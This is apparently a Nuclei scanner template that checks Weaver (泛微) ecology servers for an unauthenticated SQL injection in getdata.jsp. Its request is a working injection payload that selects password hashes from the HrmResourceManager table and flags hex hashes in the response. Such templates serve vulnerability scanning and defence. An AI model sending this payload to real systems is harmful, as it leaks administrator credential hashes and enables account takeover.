http:
    - headers:
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Cookie: JSESSIONID=random123; ecology_JSessionId=random123
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0
      matchers:
        - condition: and
          part: body
          regex:
            - '[A-F0-9]{32,}'
          type: regex
        - status:
            - 200
          type: status
      method: GET
      path:
        - '{{BaseURL}}/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager'
id: hrm-sql-password-leak
info:
    author: moyan
    description: |
        泛微存在未授权SQL注入，攻击者可利用该漏洞获取敏感信息
    name: 泛微getdata.jsp SQL Injection
    severity: critical
    tags:
        - sql-injection
        - hrm
        - password-leak
        - exposure
